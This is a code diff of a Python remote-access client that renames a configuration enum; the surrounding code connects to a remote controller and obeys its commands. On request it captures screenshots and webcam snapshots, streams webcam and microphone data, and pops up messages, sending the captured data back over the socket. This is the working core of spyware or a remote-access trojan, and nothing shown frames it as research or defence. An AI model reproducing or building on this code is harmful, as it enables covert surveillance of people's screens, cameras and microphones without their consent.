@@ -12,7 +12,7 @@ import sys
 
 # ensure project root is importable (so we can import config from parent folder)
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.realpath(__file__))))
-from config import MagicString
+from config import Message
 
 
 PATH = os.path.dirname(os.path.realpath(__file__))
@@ -39,7 +39,7 @@ s.connect((HOST,PORT))
 
 def error_response():
     global s
-    s.send(MagicString.ERROR_MSG.value.encode("utf-8"))
+    s.send(Message.ERROR_MSG.value.encode("utf-8"))
 
 def send_image_data():
     s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -71,38 +71,38 @@ def show_popup(title, message):
 while True:
     command = s.recv(52).decode("utf-8")
 
-    if command == MagicString.TAKE_SCREENSHOT.value or command == MagicString.TSS.value:
+    if command == Message.TAKE_SCREENSHOT.value or command == Message.TSS.value:
         screen = pyautogui.screenshot()
         screen.save(f"{base}\\screenshot.png")
-        s.send(MagicString.TAKEN_SCREENSHOT.value.encode("utf-8"))
+        s.send(Message.TAKEN_SCREENSHOT.value.encode("utf-8"))
         with open(f"{base}\\screenshot.png", "rb") as file:
             data = file.read(609600)
             s.send(data)
         os.remove(f"{base}\\screenshot.png")
 
-    elif command == MagicString.START_WEBCAM.value or command == MagicString.START_WEBCAM_SHORT.value:
-        s.send(MagicString.STARTING_LIVESTREAM.value.encode("utf-8"))
+    elif command == Message.START_WEBCAM.value or command == Message.START_WEBCAM_SHORT.value:
+        s.send(Message.STARTING_LIVESTREAM.value.encode("utf-8"))
         p = threading.Thread(target=sending_images)
         p.start()
 
-    elif command == MagicString.START_MICROPHONE.value or command == MagicString.START_MICROPHONE_SHORT.value:
-        s.send(MagicString.STARTING_AUDIOSTREAM.value.encode(MagicString.ENCODING_CP1252.value))
+    elif command == Message.START_MICROPHONE.value or command == Message.START_MICROPHONE_SHORT.value:
+        s.send(Message.STARTING_AUDIOSTREAM.value.encode(Message.ENCODING_CP1252.value))
         p = threading.Thread(target=sending_audio_data)
         p.start()
 
-    elif command == MagicString.TAKE_SNAPSHOT.value or command == MagicString.TSS.value:
+    elif command == Message.TAKE_SNAPSHOT.value or command == Message.TSS.value:
         camera = cv2.VideoCapture(0)
         for i in range(10):
             return_value, image = camera.read()
             cv2.imwrite('snapshot.png', image)
         del(camera)
-        s.send(MagicString.TAKEN_SNAPSHOT.value.encode("utf-8"))
+        s.send(Message.TAKEN_SNAPSHOT.value.encode("utf-8"))
         with open("snapshot.png","rb") as file:
             data = file.read(609600)
             s.send(data)
         os.remove("snapshot.png")
 
-    elif command.split(" ")[0] == MagicString.SHOW_POPUP.value and command[-1] == "'":
+    elif command.split(" ")[0] == Message.SHOW_POPUP.value and command[-1] == "'":
         title = command.split("'")[1]
         message = command.split("'")[3]
         threading.Thread(target=show_popup, args=(title, message)).start()
